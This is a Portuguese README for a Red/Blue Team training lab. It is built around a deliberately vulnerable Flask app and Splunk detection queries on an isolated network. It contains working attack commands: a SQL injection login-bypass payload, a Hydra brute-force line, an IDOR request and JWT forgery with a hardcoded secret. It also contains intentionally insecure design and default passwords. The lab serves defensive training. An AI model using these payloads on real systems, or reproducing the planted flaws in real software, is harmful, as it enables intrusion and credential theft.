# 🔐 SOC L1 Lab — NexusAI Vulnerable App

> **"Hoje qualquer um cria um site com IA em horas."**
> Então vamos ver o que acontece depois.

Este projeto demonstra, de forma prática, que gerar código com IA sem revisão de segurança resulta em aplicações com vulnerabilidades críticas — e documenta como um analista SOC L1 as detecta e investiga.

---

## 🎯 Objetivo

Construir um laboratório completo de Blue Team / Red Team onde:

1. **VM1 — Alvo**: site "criado com IA" com 5 vulnerabilidades intencionais
2. **VM3 — Kali**: execução dos ataques (Red Team)
3. **VM2 — Investigação**: detecção e análise no Splunk (Blue Team)

---

## 🏗️ Arquitetura do lab

```
┌─────────────────────────────────────────────────┐
│           Rede Host-Only (192.168.56.0/24)       │
│                                                  │
│  VM1 — Ubuntu Server      VM2 — Ubuntu Desktop  │
│  192.168.56.10             192.168.56.20         │
│  Flask App (porta 5000)    Splunk (porta 8000)   │
│         ↑                       ↑                │
│         │ logs via syslog       │ análise        │
│         └──────────────────────┘                │
│                    ↑                             │
│  VM3 — Kali Linux                                │
│  192.168.56.30                                   │
│  Hydra, SQLMap, Burp Suite                       │
└─────────────────────────────────────────────────┘
```

---

## 🚨 Vulnerabilidades implementadas

| ID | Tipo | Localização | Impacto |
|----|------|-------------|---------|
| VULN-1 | SQL Injection | `POST /api/login` | Bypass de autenticação, dump do banco |
| VULN-2 | Brute Force (sem rate limit) | `POST /api/login` | Descoberta de senhas por força bruta |
| VULN-3 | IDOR | `GET /api/clientes/{id}` | Acesso a dados de outros usuários |
| VULN-4 | Exposição de dados sensíveis | `GET /api/usuarios/me`, `/api/ia/resumo` | CPF, senha em texto puro, dados de cartão |
| VULN-5 | JWT fraco | Toda autenticação | Token sem expiração, secret key quebrável |

---

## 📂 Estrutura do repositório

```
nexus-ai/               ← código da aplicação vulnerável
  app.py                ← backend Flask (vulnerabilidades comentadas)
  requirements.txt
  templates/            ← páginas HTML
  static/               ← CSS e JS

attacks/                ← write-ups dos ataques (Red Team)
  01-sqli-bypass.md
  02-brute-force-hydra.md
  03-idor-client-data.md
  04-api-data-exposure.md
  05-jwt-forgery.md

investigations/         ← investigações no Splunk (Blue Team)
  01-sqli-detection.md
  02-brute-force-detection.md
  splunk-queries/       ← SPL queries prontas

lab-setup/              ← scripts de configuração
  setup-vm1.sh
  setup-vm2-splunk.sh
  Vagrantfile
```

---

## 🚀 Setup rápido (VM1)

```bash
# Na VM1 (Ubuntu Server)
git clone https://github.com/seu-usuario/soc-l1-lab
cd soc-l1-lab/nexus-ai
pip install -r requirements.txt
python app.py
# Site disponível em http://192.168.56.10:5000
```

**Contas de teste:**
| Usuário | Senha | Papel |
|---------|-------|-------|
| admin   | admin123 | admin |
| joao    | senha123 | user |
| maria   | maria2024 | user |

---

## ⚔️ Cenários de ataque

### VULN-1 — SQL Injection (bypass de login)
```bash
# No Kali — usando curl
curl -X POST http://192.168.56.10:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'\'' OR '\''1'\''='\''1'\'' --", "password": "qualquer"}'

# Resultado esperado: token JWT do admin sem conhecer a senha
```

### VULN-2 — Brute Force com Hydra
```bash
hydra -l joao -P /usr/share/wordlists/rockyou.txt \
  192.168.56.10 http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Credenciais inválidas"
```

### VULN-3 — IDOR
```bash
# Logado como joao, acessar cliente de maria:
curl http://192.168.56.10:5000/api/clientes/3 \
  -H "Authorization: Bearer SEU_TOKEN_AQUI"
```

### VULN-5 — Forjar JWT
```bash
# Secret key: nexus123 (hardcoded no app.py)
# Usar jwt.io ou python-jwt para forjar token de admin
python3 -c "
import jwt
token = jwt.encode({'user_id':1,'username':'admin','role':'admin'}, 'nexus123', algorithm='HS256')
print(token)
"
```

---

## 🔍 Detecção no Splunk

### Detectar brute force
```spl
index=main source="/var/log/nexus/access.log"
| rex "POST /api/login.*status=(?<status>\d+)"
| where status=401
| stats count by src_ip
| where count > 20
| sort -count
```

### Detectar SQL Injection
```spl
index=main source="/var/log/nexus/access.log"
| where like(uri_query, "%'%") OR like(uri_query, "%OR%1%=%1%")
| table _time, src_ip, uri, status
```

---

## 🗺️ MITRE ATT&CK Mapping

| Técnica | ID | Vulnerabilidade |
|---------|-----|----------------|
| Brute Force | T1110.001 | VULN-2 |
| SQL Injection | T1190 | VULN-1 |
| Unsecured Credentials | T1552 | VULN-4, VULN-5 |
| Valid Accounts | T1078 | VULN-1, VULN-5 |
| Data from Information Repositories | T1213 | VULN-3 |

---

## 📋 Write-up template

Cada cenário de ataque segue este formato:

```markdown
## Cenário: [Nome]

**MITRE ATT&CK:** T1xxx  
**Severidade:** Crítica / Alta / Média

### Contexto
O que o atacante quer fazer e por quê é possível.

### Execução do ataque
Comandos utilizados e resultado.

### Evidências no Splunk
Query SPL + screenshots dos logs.

### Timeline
HH:MM — primeiro evento detectável
HH:MM — pico do ataque
HH:MM — credencial comprometida

### Indicadores de Comprometimento (IoCs)
- IP: x.x.x.x
- User-agent: ...
- Payload: ...

### Regra de detecção proposta
SPL ou sigma rule.

### Mitigação
O que deveria ter sido feito no código.
```

---

## ⚠️ Aviso legal

Este projeto é **exclusivamente para fins educacionais** em ambiente isolado (rede local sem acesso à internet). Nunca execute estes ataques em sistemas reais ou sem autorização explícita por escrito. O objetivo é aprender defesa, não ofensa.

---

## 📚 Referências

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Splunk SPL Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
